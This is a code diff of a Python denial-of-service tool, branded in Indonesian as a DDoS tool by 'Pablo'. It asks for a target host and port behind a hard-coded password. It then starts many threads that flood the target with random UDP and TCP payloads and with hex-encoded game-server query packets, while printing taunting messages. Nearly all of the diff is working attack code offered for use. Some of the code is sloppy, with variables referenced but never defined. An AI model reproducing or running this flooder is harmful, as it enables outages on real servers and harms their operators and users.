@@ -6,41 +6,42 @@ import random
 import time
 import os
 
+pasw = "Pablo"
 
-for i in range(3):
+for i in range(1):
     pwd = input(" Password : ")
     j = 3
-    if (pwd == author):
-        time.sleep(2)
-        print("Turn On System")
-        time.sleep(.3)
+    if (pwd == pasw):
+        time.sleep(.2)
+        print(" \033[1;32;40mTurning On The System")
+        time.sleep(.2)
         break
     else:
         time.sleep(.4)
-        print("[x] AWOKAWOK SALAH \n")
+        print("\033[1;31;40m] [x]AWOKAWOK SALAH \n")
         continue
-time.sleep(.5)
-print("\033[35m Succesfull Logins To Server")
+time.sleep(.3)
+print("\033[1;36;40m Succesfull Logins To Server")
 time.sleep(.6)
 
 os.system("clear")
 print("\u001b[35m WELCOME TO TOOLS DDOS BY PABLO")
 print("\u001b[35m PERINGATAN[!] JANGAN MENGGUNAKAN TOOLS INI SEBAGAI ABUSE DDOS")
 
-print("╔══════════════════════════════════╗")
-print("║ Example How To Attack!           ║")
-print("║ 1. Masukan Host/IP               ║")
-print("║ 2. Masukan Port 80/3389/443!     ║")
-print("║ 3. Enter Dan Tools Berkerja!     ║")
-print("║ #Tools Remake By Pablo           ║")
-print("╚══════════════════════════════════╝")
+print(" ╔══════════════════════════════════╗")
+print(" ║ Example How To Attack!           ║")
+print(" ║ 1. Masukan Host/IP               ║")
+print(" ║ 2. Masukan Port 80/3389/7777/433!║")
+print(" ║ 3. Enter Untuk Menyerang Server! ║")
+print(" ║ #Tools Remake By Pablo           ║")
+print(" ╚══════════════════════════════════╝")
 
-print("\033[31m━━━ Host/IP Nya Diisi Dulu Ya Syg")
-ip = str(input("┗━>\033[0m:"))
-time.sleep(1)
-print("\033[31m━━━ Port Nya Diisi Ya Syg")
-port = int(input("┗━>\033[0m:"))
-time.sleep(1)
+print( "\033[31m━━━ Host/IP Nya Diisi Dulu Ya Syg")
+ip = str(input(" ┗━>\033[0m:"))
+time.sleep(.2)
+print(" \033[31m━━━ Port Nya Diisi Ya Syg")
+port = int(input(" ┗━>\033[0m:"))
+time.sleep(.1)
 
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
@@ -105,79 +106,102 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        ]
 
 
-def run(): 
-     data = random._urandom(1000) 
-     i = random.choice(("[*]","[!]","[#]")) 
-     while True: 
-         try: 
-             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
-             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
-             s.connect((orgip,port)) 
-             s.send(data) 
-             for x in range(times):
-                 s.send(data) 
-             print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
-         except socket.error: 
-             s.close() 
-             print("[!] PABLO BERHASIL MENEMBUS PERTAHANAN SERVER")
-            
-def run2(): 
-     data = random._urandom(1100) 
-     i = random.choice(("[*]","[!]","[#]")) 
-     while True: 
-         try: 
-             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
-             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
-             s.connect((orgip,port)) 
-             s.send(data) 
-             for x in range(times): 
-                 s.send(data) 
-             print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
-         except socket.error: 
-             s.close() 
-             print("[!] PABLO BERHASIL MENEMBUS PERTAHANAN SERVER")
+def xxxxxx():
+  data = random._urandom(1079)
+  i = random.choice(("[*]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+    except:
+      print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
-def run3(): 
-     data = random._urandom(1200) 
-     i = random.choice(("[*]","[!]","[#]")) 
-     while True: 
-         try: 
-             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
-             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
-             s.connect((orgip,port)) 
-             s.send(data) 
-             for x in range(times): 
-                 s.send(data) 
-             print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
-         except socket.error: 
-             s.close() 
-             print("[!] PABLO BERHASIL MENEMBUS PERTAHANAN SERVER")
+def xxxxx():
+  data = random._urandom(1029)
+  i = random.choice(("[*]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+    except:
+      print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
-def run4(): 
-     data = random._urandom(1300) 
-     i = random.choice(("[*]","[!]","[#]")) 
-     while True: 
-         try: 
-             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
-             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
-             s.connect((orgip,port)) 
-             s.send(data) 
-             for x in range(times): 
-                 s.send(data) 
-             print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
-         except socket.error: 
-             s.close() 
-             print("[!] PABLO BERHASIL MENEMBUS PERTAHANAN SERVER")
+def xxxx():
+  data = random._urandom(1107)
+  i = random.choice(("[*]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+    except:
+      print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
-for y in range(threads):
-    th = threading.Thread(target = run)
+def xxx():
+  data = random._urandom(3161)
+  i = random.choice(("[*]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+    except:
+      s.close()
+      print("[!] MATI LU SERVER NGENTOD")
+
+def xx():
+  data = random._urandom(1016)
+  i = random.choice(("[*]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+    except:
+      s.close()
+      print("[!] SERVER LEMAH JANCOKK")
+
+def x():
+  data = random._urandom(1894)
+  i = random.choice(("[*]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
+    except:
+      s.close()
+      print("[!] SERVER MU LEMAH SEKALI")
+
+for y in range(port):
+    th = threading.Thread(target = xxxxxx)
     th.start()
-    th = threading.Thread(target = run2)
+    th = threading.Thread(target = xxxxx)
     th.start()
-  else:
-    th = threading.Thread(target = run3)
+    th = threading.Thread(target = xxxx)
     th.start()
-    th = threading.Thread(target = run4)
+    th = threading.Thread(target = xxx)
+    th.start()
+    th = threading.Thread(target = xx)
+    th.start()
+    th = threading.Thread(target = x)
     th.start()
 
 
@@ -206,7 +230,6 @@ class MyThread(threading.Thread):
                 elif(int(port) == 1111):
                     sock.sendto(Pacotes[9], (ip, int(port)))    
                 
-author = "Pablo"
 
 if __name__ == '__main__':
     try:
